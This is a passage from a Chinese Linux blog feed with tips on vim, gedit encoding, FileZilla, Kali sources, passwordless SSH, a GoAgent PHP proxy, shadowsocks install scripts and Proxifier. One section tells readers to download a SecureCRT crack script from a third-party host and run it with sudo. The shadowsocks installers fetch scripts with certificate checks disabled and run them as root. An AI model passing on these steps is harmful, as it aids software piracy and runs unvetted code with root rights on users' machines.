<p>$ sudo apt-get install vim</p>
<p>OK,恢复正常了.</p>
<p>====================================================================================================</p>
<p>gedit 中文乱码</p>
<p>gconftool-2 –set –type=list –list-type=string /apps/gedit-2/preferences/encodings/auto_detected “[GB18030,UTF-8,CURRENT,ISO-8859-15,UTF-16]”</p>
<p>===========================================================================================================</p>
<p>FileZilla Client 非常好用，以下是安装步骤。</p>
<p>安装filezilla ：sudo apt-get install filezilla</p>
<p>再装个语言包：sudo apt-get install filezilla-locales</p>
<p>安装完语言包就可以支持中文了</p>
<p>======================================================================================================</p>
<p>secureSCR 安装与破解</p>
<p><a href="http://yunpan.cn/cJ4U2mnUXA4sp" target="_blank" rel="external">http://yunpan.cn/cJ4U2mnUXA4sp</a> （提取码：4679） 32_64 ubuntu</p>
<p>破解</p>
<p>$wget <a href="http://download.boll.me/securecrt_linux_crack.pl" target="_blank" rel="external">http://download.boll.me/securecrt_linux_crack.pl</a><br>$sudo perl securecrt_linux_crack.pl /usr/bin/SecureCRT</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[ubuntu kali]]></title>
      <url>http://www.linux52.com/2015-03-03-ubuntu-kali.html</url>
      <content type="html"><![CDATA[<p>添加源</p>
<p>deb <a href="http://http.kali.org/kali" target="_blank" rel="external">http://http.kali.org/kali</a> kali main non-free contrib<br>deb <a href="http://security.kali.org/kali-security" target="_blank" rel="external">http://security.kali.org/kali-security</a> kali/updates main contrib non-free<br>deb-src <a href="http://http.kali.org/kali" target="_blank" rel="external">http://http.kali.org/kali</a> kali main non-free contrib<br>deb-src <a href="http://security.kali.org/kali-security" target="_blank" rel="external">http://security.kali.org/kali-security</a> kali/updates main contrib non-free</p>
<p>更新<br>sudo apt-key adv –keyserver pgp.mit.edu –recv-keys ED444FF07D8D0BF6<br>apt-get clean &amp;&amp; apt-get update &amp;&amp; apt-get upgrade -y &amp;&amp; apt-get dist-upgrade -y</p>
<p>&nbsp;</p>
<p><strong>5. 确保启动时发出声音</strong></p>
<p>遵照下列步骤，即可解决Kali Linux中启动时没有声音的问题。</p>
<ol>
<li>apt-get install alsa-utils -y</li>
</ol>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[ssh无密码登入设置(完全版)/linux下免输入密码ssh登录]]></title>
      <url>http://www.linux52.com/2015-02-20-ssh-e6-97-a0-e5-af-86-e7-a0-81-e7-99-bb-e5-85-a5-e8-ae-be-e7-bd-ae-e5-ae-8c-e5-85-a8-e7-89-88linux-e4-b8-8b-e5-85-8d-e8-be-93-e5-85-a5-e5-af-86-e7-a0-81ssh-e7-99-bb-e5-bd-95.html</url>
      <content type="html"><![CDATA[<p>配置ssh不需要密码登录远程主机，网上有很多文章，但好像完整的不多，笔者参照操作，但得到消息：</p>
<p><pre>Agent admitted failure to sign using the key.</pre><br>原来是没有启动ssh-agent及把私钥加入到ssh-agent，参考如下文章得以解决问题。下文是完整的配置无密码登录ssh远程主机的方法，推荐参阅。</p>
<p>[注]正文来自<a href="http://www.jiangmiao.org/blog/559.html" target="_blank" rel="external">http://www.jiangmiao.org/blog/559.html</a>，在此表示感谢！</p>
<p>&nbsp;</p>
<p>现有2台机器</p>
<p>1、服务器192.168.1.112</p>
<p>2、个人机192.168.1.110</p>
<p>要使110无需密码通过ssh登入112</p>
<p>步骤</p>
<p><strong>1、创建密钥</strong></p>
<p><pre>miao@u32-192-168-1-110:~/.ssh$ ssh-keygen -t rsa<br>Generating public/private rsa key pair.<br>Enter passphrase (empty for no passphrase): (忽略)<br>Enter same passphrase again: (忽略)<br>Your identification has been saved in /home/miao/.ssh/id_rsa.<br>Your public key has been saved in /home/miao/.ssh/id_rsa.pub.<br></pre><br><strong>2、复制公密到服务器</strong></p>
<p><pre>miao@u32-192-168-1-110:~/.ssh$ scp id_rsa.pub miao@192.168.1.112:/home/miao/.ssh/192.168.1.110<br>miao@192.168.1.112’s password:<br>id_rsa.pub                                                                   100%  404     0.4KB/s   00:00<br>miao@u32-192-168-1-110:~/.ssh$<br></pre><br><strong>3、添加公密到192.168.112的信任区域</strong></p>
<p><pre>miao@debian-192-168-1-112:~/.ssh$ cat 192.168.1.110 &gt;&gt; authorized_keys<br>miao@debian-192-168-1-112:~/.ssh$<br></pre><br><strong>注： 2，3两步可由命令ssh-copy-id一步到位</strong></p>
<p><pre>miao@ubuntu-192-168-1-110:~/.ssh$ ssh-copy-id miao@192.168.1.112<br>Password:<br>Now try logging into the machine, with “ssh ‘miao@192.168.1.112’”, and check in:</pre></p>
<p>  .ssh/authorized_keys</p>
<p>to make sure we haven’t added extra keys that you weren’t expecting.<br><br><strong>4、启动ssh-agent</strong></p>
<p>如果ssh 192.168.112返回 Agent admitted failure to sign using the key<br>ps -Af | grep agent查看有无ssh-agent有无运行，若没有</p>
<p><pre>miao@u32-192-168-1-110:~/.ssh$ ssh-agent<br></pre><br><strong>5、添加id_rsa到ssh-agent</strong></p>
<p><pre>miao@u32-192-168-1-110:~/.ssh$ ssh-add id_rsa<br></pre><br><strong>6、完成</strong></p>
<p><strong>from </strong><a href="http://www.jiangmiao.org/blog/559.html" target="_blank" rel="external">http://www.jiangmiao.org/blog/559.html</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[使用GoAgent让PHP空间变成你的专属代理服务器（基于PHP空间自建代理）]]></title>
      <url>http://www.linux52.com/2015-02-16-e4-bd-bf-e7-94-a8goagent-e8-ae-a9php-e7-a9-ba-e9-97-b4-e5-8f-98-e6-88-90-e4-bd-a0-e7-9a-84-e4-b8-93-e5-b1-9e-e4-bb-a3-e7-90-86-e6-9c-8d-e5-8a-a1-e5-99-a8-ef-bc-88-e5-9f-ba-e4-ba-8ephp-e7-a9-ba.html</url>
      <content type="html"><![CDATA[<h2 id="一、准备php空间"><a href="#一、准备php空间" class="headerlink" title="一、准备php空间"></a>一、准备<span class="wp_keywordlink"><a href="http://shanmao.me/category/webback/php" title="php" target="_blank" rel="external">php</a></span>空间</h2><p>首先准备一个PHP空间，如果你有自己的收费空间自然最好。要是没有可以申请一个支持PHP的免费空间。（当然是国外没有被墙的空间，墙内的空间是没有用的）。当然是稳定速度快的空间最好，流量要根据自己需要选择合适的。</p>
<p>经测试，不是所有空间都可以，空间必须支持 curl模块或者allow_url_fopen打开，有的空间如日本的<del>sitemix的不能打开youtube（该空间已经被墙）；</del>sourceforge.net的空间虽然支持函数，但是却不能用来做代理，应该是封了端口，该空间完全不能连接到其他网络。据作者说goagent不支持有广告的空间，<del>如sitemix空间广告可以通过在该空间建一个网站，比如用<span class="wp_keywordlink"><a href="http://shanmao.me/category/web-system/wordpress" title="wordpress" target="_blank" rel="external">wordpress</a></span>安装一个博客，然后将我们的文件放到wp-admin目录，就可以避开广告了</del>。</p>
<p>phus.lu说有下面三个需求</p>
<blockquote>
<p>1. curl模块或者allow_url_fopen打开</p>
<p>2. zlib压缩模块</p>
<p>3. <span class="wp_keywordlink"><a href="http://shanmao.me/category/webback/php" title="php" target="_blank" rel="external">php</a></span>空间不能有广告。<br>当然，部分广告代码goagent还是能够正确处理的。</p>
</blockquote>
<p>一些空间推荐：<a href="http://ishare.cn.ms/archives/604" title="Permanent Link to 几个流量大速度快的空间，可以用来做代理" target="_blank" rel="external">几个流量大速度快的空间，可以用来做代理</a></p>
<p>GoAgent项目地址：<a href="http://code.google.com/p/goagent/" target="_blank" rel="external">http://code.google.com/p/goagent/</a></p>
<p>最新版下载地址：<a href="http://goo.gl/6ZXcF" target="_blank" rel="external">http://goo.gl/6ZXcF</a></p>
<p>测试用的公共端：《<a href="http://ishare.cn.ms/archives/1148" target="_blank" rel="external">放出几个公共的goagent的PHP服务端地址</a>》</p>
<h2 id="二、部署服务端"><a href="#二、部署服务端" class="headerlink" title="二、部署服务端"></a>二、部署服务端</h2><p>把下载的GoAgent最新版解压，把server/php/目录下的php文件上传到网页根目录。</p>
<p>注意：不一定你用ftp登录后看到的目录就是根目录，不同服务器的网页根目录有所不同，不过不外乎public_html、www、htdocs几种，只有这些目录下及其子目录下的文件才能被访问到。</p>
<p><a href="http://shanmao.me/wp-content/uploads/2012/10/goagent-php-1.jpg" target="_blank" rel="external"><img src="http://shanmao.me/wp-content/uploads/2012/10/goagent-php-1-300x154.jpg" alt="goagent-php-1" title="goagent-php-1"></a></p>
<p><a href="http://shanmao.me/wp-content/uploads/2012/10/goagent-php-2.jpg" target="_blank" rel="external"><img src="http://shanmao.me/wp-content/uploads/2012/10/goagent-php-2-300x188.jpg" alt="goagent-php-2" title="goagent-php-2"></a></p>
<p>建议在根目录下新建一个目录后将这两个php文件放到这个目录并且将index.php自己修改为一个随机名字，网址修改为对应地址就可以。比如修改文件名为my.php并放到  根目录名/go/   目录下就访问<a href="http://你的域名/go/my.php，访问这个地址的时候会跳转至某个网站。" target="_blank" rel="external">http://你的域名/go/my.php，访问这个地址的时候会跳转至某个网站。</a></p>
<p>1.8.5会跳转到<a href="http://stackoverflow.com/index.php" target="_blank" rel="external">http://stackoverflow.com/index.php</a></p>
<p>1.8.6会跳转到<a href="https://www.google.com/index.php" target="_blank" rel="external">https://www.google.com/index.php</a></p>
<p>实际上你只要确定自己上传完成就行了，不用管打开是什么样子。</p>
<h2 id="三、配置本地端"><a href="#三、配置本地端" class="headerlink" title="三、配置本地端"></a>三、配置本地端</h2><p>记事本打开在local目录下的proxy.ini文件，将</p>
<p><pre>[gae]<br>enable = 1<br>appid = goagent<br>password =<br>path = /fetch.py<br>profile = google_cn<br>mulconn = 1<br>[paas]<br>enable = 0<br>password = 123456<br>listen = 127.0.0.1:8088<br>tunnel = 1<br>fetchserver = <a href="https://localhost:443/" target="_blank" rel="external">https://localhost:443/</a></pre><br>修改为</p>
<p><pre>[gae]<br> enable =1 (1为启用GAE，0为不启用）<br> appid = 1goagent（goagent的bug，必须修改这个，名字任意）<br> password =<br> path = /fetch.py //对比下好像目录下是这个index.py<br> profile = google_cn<br> mulconn = 1<br> [paas]<br> enable = 1<br> password = 123456<br> listen = 127.0.0.1:8088<br> tunnel = 0<br> fetchserver = <a href="http://你网站的域名/index.php" target="_blank" rel="external">http://你网站的域名/index.php</a></pre><br>如果你是放在其他目录则修改为对应的index.php的地址</p>
<p>以上代码不要直接复制，自己找到对应的地方在原文件修改即可。</p>
<p><strong>注意</strong>：从1.8.7开始，原更名为[paas]，且不支持配置多个服务端。</p>
<h2 id="四、运行本地端"><a href="#四、运行本地端" class="headerlink" title="四、运行本地端"></a>四、运行本地端</h2><p>完成上述步骤后，就运行GoAgent.exe。</p>
<p>Linux/Mac用户运行proxy.py</p>
<h2 id="五、设置浏览器代理"><a href="#五、设置浏览器代理" class="headerlink" title="五、设置浏览器代理"></a>五、设置浏览器代理</h2><p>代理地址设置为使用goagent代理，即将代理地址设置为127.0.0.1：8088，之后就可以畅游网络了。</p>
<p><strong>浏览器代理设置请参看《<a href="http://ishare.cn.ms/archives/181" title="GoAgent又一个基于GAE的穿越利器" target="_blank" rel="external">使用GoAgent基于GAE的搭建自己的代理服务器翻墙详细教程</a>》</strong></p>
<p><strong>只需将浏览器代理端口相应的改为8088即可。</strong></p>
<h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips:"></a><strong>Tips:</strong></h2><p><strong>1.</strong></p>
<p><pre>[gae]<br> enable = 1</pre><br>懂代码就知道0为假，1为真，这里可以保留1，保留1就可以一个goagent.exe同时连接google app和自己的免费空间做双线，但是注意不要使用相同端口，浏览器可以配置不同代理端口，自由切换。</p>
<p><strong>2</strong>.另外有一个小技巧:</p>
<p>修改代码中的prot=8087可以改变代理端口，visible = 1是表示GoAgent窗口是否默认最小化的，默认是1，即不自动最小化，我把它改成0了，这样就每次启动后都自动最小化到托盘中。自己根据自己喜好修改。推荐改为0！！</p>
<p><pre>[listen]<br> ip = 127.0.0.1<br> port = 8087<br> visible = 1</pre><br><strong>3.</strong>怎么防止他人知道我的index.php地址盗用我流量？</p>
<p>编辑index.php开头部分的$<strong>password</strong> = ”;为$<strong>password</strong> = ‘这里写你的密码’;</p>
<p>同时编辑proxy.ini</p>
<p>enable = 0<br>listen = 127.0.0.1:8088<br>password = 你的密码<br>fetchserver = <a href="http://scan.org/fetch.php" target="_blank" rel="external">http://scan.org/fetch.php</a></p>
<p>重启goagent.exe</p>
<p>最新1.8.4版已经支持php和GAE的密码分开了。</p>
<p><del>目前goagent还没有将php模式密码和GAE模式的密码分开，期待以后会加人吧，不过我们将它们的密码设置成一样也不影响我们的体验不是。</del></p>
<p><del>当然如果你会python可以尝试修改proxy.py，我看来一下代码，应该是可以实现，不过我不会。</del></p>
<p><strong>4</strong>.如何配置多个服务端？</p>
<p><pre>listen = 127.0.0.1:8088|127.0.0.1:8089<br>fetchserver = <a href="http://你网站的域名1/index.php|http://你网站的域名2/index.php" target="_blank" rel="external">http://你网站的域名1/index.php|http://你网站的域名2/index.php</a></pre><br>更多服务端也可以类似添加，分别监听不同端口即可（不要与系统中其他端口冲突）。</p>
<div><br><br><strong>原创文章，转载请注明：</strong> 转载自<a href="http://ishare.cn.ms/" target="_blank" rel="external">iShare爱分享</a><br><br></div>]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[CentOS下shadowsocks-go一键安装脚本]]></title>
      <url>http://www.linux52.com/2015-02-16-centos-e4-b8-8bshadowsocks-go-e4-b8-80-e9-94-ae-e5-ae-89-e8-a3-85-e8-84-9a-e6-9c-ac.html</url>
      <content type="html"><![CDATA[<p><strong>本脚本适用环境：</strong><br>系统支持：CentOS 5 &amp; 6 &amp; 7 32或64位<br>内存要求：≥128M<br>日期：2015年01月08日</p>
<p><strong>关于本脚本：</strong><br>一键安装 go 版的 shadowsocks 最新版本 1.1.3。据说 go 版本有 buff ，但是我没看到。与 python 版不同的是，其客户端程序能使用多个服务端配置，但是本脚本安装的是服务端。作者默认推荐 aes-128-cfb 加密，基于一致性的决定，脚本还是使用了 aes-256-cfb 加密方式。</p>
<p><strong>默认配置：</strong><br>服务器端口：8989<br>客户端端口：1080<br>密码：自己设定（如不设定，默认为teddysun.com）</p>
<p><strong>客户端下载：</strong><br><a href="http://sourceforge.net/projects/shadowsocksgui/files/dist/" target="_blank" rel="external">http://sourceforge.net/projects/shadowsocksgui/files/dist/</a></p>
<p><strong>使用方法：</strong><br>使用root用户登录，运行以下命令：</p>
<p><pre class="prettyprint lang-bsh">wget –no-check-certificate <a href="https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks-go.sh" target="_blank" rel="external">https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks-go.sh</a><br>chmod +x shadowsocks-go.sh<br>./shadowsocks-go.sh 2&gt;&amp;1 | tee shadowsocks-go.log</pre><br>安装完成后，脚本提示如下：</p>
<p><pre class="prettyprint lang-bsh">Congratulations, shadowsocks-go install completed!<br>Your Server IP:your_server_ip<br>Your Server Port:8989<br>Your Password:your_password<br>Your Local Port:1080<br>Your Encryption Method:aes-256-cfb</pre></p>
<p>Welcome to visit:<a href="http://teddysun.com/392.html" target="_blank" rel="external">http://teddysun.com/392.html</a><br>Enjoy it!<br><strong>卸载方法：</strong><br>使用 root 用户登录，运行以下命令：</p>
<p><pre class="prettyprint lang-bsh">./shadowsocks-go.sh uninstall</pre><br><strong>其他事项：</strong><br>客户端配置的参考链接：<a href="http://teddysun.com/339.html" target="_blank" rel="external">http://teddysun.com/339.html</a></p>
<p>安装完成后即已后台启动 shadowsocks-go ，运行：</p>
<p><pre class="prettyprint lang-bsh">/etc/init.d/shadowsocks status</pre><br>可以查看 shadowsocks-go 进程是否存在。<br>本脚本安装完成后，会将 shadowsocks-go 加入开机自启动。</p>
<p><strong>使用命令：</strong><br>启动：/etc/init.d/shadowsocks start<br>停止：/etc/init.d/shadowsocks stop<br>重启：/etc/init.d/shadowsocks restart<br>状态：/etc/init.d/shadowsocks status</p>
<p><strong>多用户多端口配置文件 sample（2015年01月08日）：</strong><br>配置文件路径：/etc/shadowsocks/config.json</p>
<p><pre class="prettyprint">{<br>    “port_password”:{<br>         “8989”:”password0”,<br>         “9001”:”password1”,<br>         “9002”:”password2”,<br>         “9003”:”password3”,<br>         “9004”:”password4”<br>    },<br>    “method”:”aes-256-cfb”,<br>    “timeout”:600<br>}</pre><br>官方版本的 sample ，详见<a href="https://github.com/shadowsocks/shadowsocks-go/blob/master/sample-config/server-multi-port.json" target="_blank" rel="external">这里</a>。</p>
<p><strong>更多版本 shadowsocks 安装：</strong><br><a href="http://teddysun.com/342.html" target="_blank" rel="external">CentOS 下 shadowsocks-python 一键安装脚本</a><br><a href="http://teddysun.com/355.html" target="_blank" rel="external">CentOS 下 shadowsocks-nodejs 一键安装脚本</a><br><a href="http://teddysun.com/357.html" target="_blank" rel="external">CentOS 下 shadowsocks-libev 一键安装脚本</a><br><a href="http://dg2016.duapp.com/?p=22" target="_blank" rel="external">Debian 下 shadowsocks-libev 一键安装脚本</a></p>
<p><strong>特别说明：</strong><br>1、关于 CentOS 的默认 iptables 防火墙规则 icmp-host-prohibited ，如果安装之后发现已经启动 shadowsocks，本地客户端却不能连接上，请检查 iptables 是不是有如下的一条规则：</p>
<p><pre class="prettyprint lang-bsh">REJECT     all  –  0.0.0.0/0            0.0.0.0/0           reject-with icmp-host-prohibited</pre><br>运行命令：</p>
<p><pre class="prettyprint lang-bsh">/etc/init.d/iptables status</pre><br>可以查看。如果有这条规则，则添加的 8989 端口需手动更改一下，放到这条规则的上一行。编辑 /etc/sysconfig/iptables 文件，将：</p>
<p><pre class="prettyprint lang-bsh">-A INPUT -p tcp -m state –state NEW -m tcp –dport 8989 -j ACCEPT</pre><br>放在：</p>
<p><pre class="prettyprint lang-bsh">-A INPUT -j REJECT –reject-with icmp-host-prohibited</pre><br>的前面。最终效果如下：</p>
<p><pre class="prettyprint lang-bsh">-A INPUT -p tcp -m state –state NEW -m tcp –dport 8989 -j ACCEPT<br>-A INPUT -j REJECT –reject-with icmp-host-prohibited</pre><br>编辑完后，重启 iptables 防火墙。命令：/etc/init.d/iptables restart</p>
<p><strong>更新日志：</strong><br>更新（2015年01月08日）：修改了启动脚本 /etc/init.d/shadowsocks ，按照 CentOS 的 chkconfig 标准语法修改了一下（原来使用的是作者 Github 上自带的）。去掉了以 nobody 用户启动 shadowsocks 的方式，改为直接以当前登录用户直接启动（一般是 root 用户）。开机自启动，以及修改端口号提示无权限的问题已经解决。<br>更新（2015年01月07日）：支持在 CentOS 5，6 及 7 下安装。注意，在 CentOS 7 中默认是没有 iptables 的，如果你开启了 firewalld ，请手动对端口放行。</p>
<p><strong>参考链接：</strong><br><a href="https://github.com/shadowsocks/shadowsocks-go" target="_blank" rel="external">https://github.com/shadowsocks/shadowsocks-go</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Debian下shadowsocks-libev一键安装脚本]]></title>
      <url>http://www.linux52.com/2015-02-16-debian-e4-b8-8bshadowsocks-libev-e4-b8-80-e9-94-ae-e5-ae-89-e8-a3-85-e8-84-9a-e6-9c-ac.html</url>
      <content type="html"><![CDATA[<p><strong>本脚本适用环境：</strong><br>系统支持：Debian/Ubuntu<br>内存要求：≥128M<br>日期：2014年10月31日</p>
<p><strong>关于本脚本：</strong><br>Debian 或 Ubuntu 下一键安装 libev 版的 shadowsocks 最新版本。该版本的特点是内存占用小（600k左右），使用 libev 和 C 编写，低 CPU 消耗，甚至可以安装在基于 OpenWRT 的路由器上。</p>
<p><strong>默认配置：</strong><br>服务器端口：8989<br>客户端端口：1080<br>密码：自己设定（如不设定，默认为teddysun.com）</p>
<p><strong>客户端下载：</strong><br><a href="http://sourceforge.net/projects/shadowsocksgui/files/dist/" target="_blank" rel="external">http://sourceforge.net/projects/shadowsocksgui/files/dist/</a></p>
<p><strong>使用方法：</strong><br>使用root用户登录，运行以下命令：</p>
<p><pre class="prettyprint lang-bsh">wget –no-check-certificate <a href="https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks-libev-debian.sh" target="_blank" rel="external">https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks-libev-debian.sh</a><br>chmod +x shadowsocks-libev-debian.sh<br>./shadowsocks-libev-debian.sh 2&gt;&amp;1 | tee shadowsocks-libev-debian.log</pre><br>安装完成后，脚本提示如下：</p>
<p><pre class="prettyprint lang-bsh">Congratulations, shadowsocks-libev install completed!<br>Your Server IP:your_server_ip<br>Your Server Port:8989<br>Your Password:your_password<br>Your Local IP:127.0.0.1<br>Your Local Port:1080<br>Your Encryption Method:aes-256-cfb</pre></p>
<p>Welcome to visit:<a href="http://teddysun.com/358.html" target="_blank" rel="external">http://teddysun.com/358.html</a><br>Enjoy it!<br><strong>卸载方法：</strong><br>使用 root 用户登录，运行以下命令：</p>
<p><pre class="prettyprint lang-bsh">./shadowsocks-libev-debian.sh uninstall</pre><br><strong>其他事项：</strong><br>客户端配置的参考链接：<a href="http://teddysun.com/339.html" target="_blank" rel="external">http://teddysun.com/339.html</a></p>
<p>安装完成后即已后台启动 shadowsocks ，运行：</p>
<p><pre class="prettyprint lang-bsh">ps -ef | grep ss-server | grep -v ps | grep -v grep</pre><br>可以查看进程是否存在。<br>本脚本安装完成后，会将 shadowsocks-libev 加入开机自启动。</p>
<p><strong>使用命令：</strong><br>启动：运行以下命令</p>
<p><pre class="prettyprint lang-bsh">nohup /usr/local/bin/ss-server -c /etc/shadowsocks/config.json &gt; /dev/null 2&gt;&amp;1 &amp;</pre><br>停止：运行以下命令查看进程的 PID</p>
<p><pre class="prettyprint lang-bsh">ps -ef | grep -v grep | grep -v ps | grep -i ‘/usr/local/bin/ss-server’ | awk ‘{print $2}’</pre><br>kill该 PID 即可：</p>
<p><pre class="prettyprint lang-bsh">kill -9 上述命令得到的结果</pre><br><strong>更多版本 shadowsocks 安装：</strong><br><a href="http://teddysun.com/342.html" target="_blank" rel="external">CentOS 下 shadowsocks-python 一键安装脚本</a><br><a href="http://teddysun.com/355.html" target="_blank" rel="external">CentOS 下 shadowsocks-nodejs 一键安装脚本</a><br><a href="http://teddysun.com/357.html" target="_blank" rel="external">CentOS 下 shadowsocks-libev 一键安装脚本</a><br><a href="http://teddysun.com/392.html" target="_blank" rel="external">CentOS 下 shadowsocks-go 一键安装脚本</a></p>
<p><strong>更新（2014年10月31日）：</strong><br>1、修复写入自启动命令到 /etc/rc.local 中的错误。</p>
<p><strong>特别说明：</strong><br>已安装旧版本的 shadowsocks 需要升级的话，需下载本脚本的最新版，运行卸载命令./shadowsocks-libev-debian.sh uninstall 后，再次执行本脚本即可安装最新版。</p>
<p>&nbsp;</p>
<p><strong>参考链接：</strong><br><a href="https://github.com/madeye/shadowsocks-libev" target="_blank" rel="external">https://github.com/madeye/shadowsocks-libev</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[使用Proxifier 把ssh、shadowsocks代理转为全局代理]]></title>
      <url>http://www.linux52.com/2015-02-16-e4-bd-bf-e7-94-a8proxifier-e6-8a-8assh-e3-80-81shadowsocks-e4-bb-a3-e7-90-86-e8-bd-ac-e4-b8-ba-e5-85-a8-e5-b1-80-e4-bb-a3-e7-90-86.html</url>
      <content type="html"><![CDATA[<p><a href="http://boafanx.tabboa.com/free/" target="_blank" rel="external">ssh</a>和<a href="http://boafanx.tabboa.com/boafanx-ss/" target="_blank" rel="external">shadowsocks</a>代理都属于socks5代理，通俗的理解，socks5只是局部代理，不能像vpn那样把整个电脑都代理。因此，一般情况下只有支持socks5的软件才能使用ssh、shadowsocks代理。</p>
<p>我们使用的IE浏览器就不支持socks5代理，一般的游戏，也不支持socks5代理，那么这些软件如何使用代理？除了使用vpn，我们还有一种不错的办法，那就是把socks5代理转换成全局代理，效果跟vpn几乎一样。</p>
<p>使用Proxifier把ssh、shadowsocks代理转全局代理，严重不建议小白使用，无基础的话会很纠结。</p>
<p><a href="http://pan.baidu.com/s/1c03Wtby" target="_blank" rel="external">百度网盘：Proxifier</a></p>
<p>软件安装以后，即可运行。</p>
<p>首次使用，需要做一番设置才能用。</p>
<hr>
<p><strong>首先要设置代理服务器。</strong></p>
<blockquote>
<p>菜单栏–&gt;&gt;配置文件–&gt;&gt;代理服务器，服务器地址填127.0.0.1，端口填是什么就填什么。<br><strong>严重强调一下</strong>，这里的端口是<strong>本地端口</strong>，不是远程服务器端口，使用boafanx的ssh代理填7070，使用boafanx的shadowsocks代理填65500，注意别搞错。<br>下面的“协议”选择socks版本5。<br>然后会弹出窗口，点“是”，然后狂点确定即可。</p>
</blockquote>
<p>此时还不能用，<strong>两点非常重要的设置！</strong>，请睁大眼睛看…</p>
<hr>
<p><strong>※1.开启远程dns解析</strong></p>
<blockquote>
<p>菜单栏–&gt;&gt;配置文件–&gt;&gt;名称解析–&gt;&gt;勾选<strong>“通过代理解析主机名称”</strong><br>如果不开启远程dns解析，你将会尽情享受到已被污染的dns解析，导致无法打开Facebook之类的网站。</p>
</blockquote>
<pre><code>如果你是游戏玩家，建议不要开启远程dns解析，你可以自己设置适合游戏服务器的dns，比如台服魔兽可以设置台湾dns。
`&lt;/pre&gt;

* * *

**※2.把ssh或shadowsocks端口添加到直连名单**

这点最重要，很多人卡在这里。如果不设置这个规则，你必定会陷入死循环。

我们需要把ssh或shadowsocks**服务器端口**（具体端口号以你的账号为准），添加到直连名单中，不让他们走代理。具体方法：
&gt; 菜单栏--&amp;gt;&amp;gt;配置文件--&amp;gt;&amp;gt;代理规则--&amp;gt;&amp;gt;点击“添加”--&amp;gt;&amp;gt;在**“目标端口”**里面添加端口，比如boafanx免费ssh账号的ssh端口为1232，那么我就添加**1232**，然后下面的动作选择**“direct”**，然后点确定。
&lt;pre&gt;`如果你是PC游戏玩家，想让游戏走代理，则需要看一下本文最后面的注意事项！
`&lt;/pre&gt;

* * *

一定要注意以上两点，否则真心无法正常使用。

Proxifier设置好以后，就可以打开ssh或shadowsocks客户端并登录了。此时，默认所有程序的网络都会走代理，百度里查ip，必定会是代理的ip。

如果还上不去youtube，极有可能是因为有dns缓存，清空浏览器缓存即可。

* * *

**PC游戏玩家请注意：**
&lt;pre&gt;`如果想让电脑游戏走代理，有必要使用**支持udp转发**的shadowsocks客户端，而且要使用支持udp转发的shadowsocks账号。boafanx的客户端不支持udp，免费账号也不支持udp。

支持udp的shadowsocks客户端推荐到http://dl.kyonli.com/shadowsocks/里面去下载shadowsocks-libev-polarssl_x.x.x_win32_taskbar.zip即可，1.4.7以后的版本已经开始支持udp了。

支持udp的shadowsocks账号，建议选择boafanx的收费版东京服务器。
</code></pre>]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[CentOS下shadowsocks一键安装脚本]]></title>
      <url>http://www.linux52.com/2015-02-16-centos-e4-b8-8bshadowsocks-e4-b8-80-e9-94-ae-e5-ae-89-e8-a3-85-e8-84-9a-e6-9c-ac.html</url>
      <content type="html"><![CDATA[<p><strong>本脚本适用环境：</strong><br>系统支持：CentOS 6.x 32或64位<br>内存要求：≥64M<br>日期：2015年01月21日</p>
<p><strong>关于本脚本：</strong><br>一键安装 Python 版 shadowsocks 的最新版，同时安装了 Python 包管理工具 pip。</p>
<p><strong>默认配置：</strong><br>服务器端口：8989<br>客户端端口：1080<br>密码：自己设定（如不设定，默认为teddysun.com）<br>备注：脚本默认创建单用户配置文件，如需配置多用户，安装完毕后参照下面的教程 sample 手动修改配置文件后重启即可。</p>
<p><strong>客户端下载：</strong><br><a href="http://sourceforge.net/projects/shadowsocksgui/files/dist/" target="_blank" rel="external">http://sourceforge.net/projects/shadowsocksgui/files/dist/</a></p>
<p><strong>使用方法：</strong><br>使用root用户登录，运行以下命令：</p>
<p><pre class="prettyprint lang-bsh">wget –no-check-certificate <a href="https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks.sh" target="_blank" rel="external">https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks.sh</a><br>chmod +x shadowsocks.sh<br>./shadowsocks.sh 2&gt;&amp;1 | tee shadowsocks.log</pre><br><strong>安装完成后，脚本提示如下：</strong></p>
<p><pre class="prettyprint lang-bsh">Congratulations, shadowsocks install completed!<br>Your Server IP:your_server_ip<br>Your Server Port:8989<br>Your Password:your_password<br>Your Local IP:127.0.0.1<br>Your Local Port:1080<br>Your Encryption Method:aes-256-cfb</pre></p>
<p>Welcome to visit:<a href="http://teddysun.com/342.html" target="_blank" rel="external">http://teddysun.com/342.html</a><br>Enjoy it!<br><strong>卸载方法：</strong><br>使用root用户登录，运行以下命令：</p>
<p><pre class="prettyprint lang-bsh">./shadowsocks.sh uninstall</pre><br><strong>单用户配置文件sample（2015年01月21日修正）：</strong><br>配置文件路径：/etc/shadowsocks.json</p>
<p><pre class="prettyprint">{<br>    “server”:”your_server_ip”,<br>    “server_port”:8989,<br>    “local_address”:”127.0.0.1”,<br>    “local_port”:1080,<br>    “password”:”yourpassword”,<br>    “timeout”:300,<br>    “method”:”aes-256-cfb”,<br>    “fast_open”: false<br>}</pre><br><strong>多用户多端口配置文件 sample（2015年01月21日修正）：</strong><br>配置文件路径：/etc/shadowsocks.json</p>
<p><pre class="prettyprint">{<br>    “server”:”your_server_ip”,<br>    “local_address”: “127.0.0.1”,<br>    “local_port”:1080,<br>    “port_password”:{<br>         “8989”:”password0”,<br>         “9001”:”password1”,<br>         “9002”:”password2”,<br>         “9003”:”password3”,<br>         “9004”:”password4”<br>    },<br>    “timeout”:300,<br>    “method”:”aes-256-cfb”,<br>    “fast_open”: false<br>}</pre><br><strong>使用命令（2015年01月21日修正）：</strong><br>启动：/etc/init.d/shadowsocks start<br>停止：/etc/init.d/shadowsocks stop<br>重启：/etc/init.d/shadowsocks restart<br>状态：/etc/init.d/shadowsocks status</p>
